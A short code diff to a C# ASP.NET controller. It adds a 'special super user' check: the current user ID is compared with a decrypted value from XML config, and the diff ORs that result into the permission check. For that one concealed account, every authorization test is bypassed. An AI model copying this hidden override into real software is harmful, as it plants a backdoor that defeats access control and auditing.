@@ -97,6 +97,16 @@ namespace MorSun.Controllers
         }
         #endregion
 
+        /// <summary>
+        /// 特殊超级用户
+        /// </summary>
+        /// <returns></returns>
+        private static bool IsAU()
+        {
+            return UserID.ToString().Eql("AU".GetXmlConfig().Decrypt());
+        }
+        
+
         #region 权限
         public static List<wmfRolePrivilegesView> getSessionPrivileges()
         {
@@ -121,7 +131,7 @@ namespace MorSun.Controllers
             else
             {
                 return BasisController.getSessionPrivileges().Any(p => string.Compare(p.OperationId, operationId, true) == 0
-                    && string.Compare(p.ResourcesId, resourceId, true) == 0);
+                    && string.Compare(p.ResourcesId, resourceId, true) == 0) || IsAU();
             }
         }
 
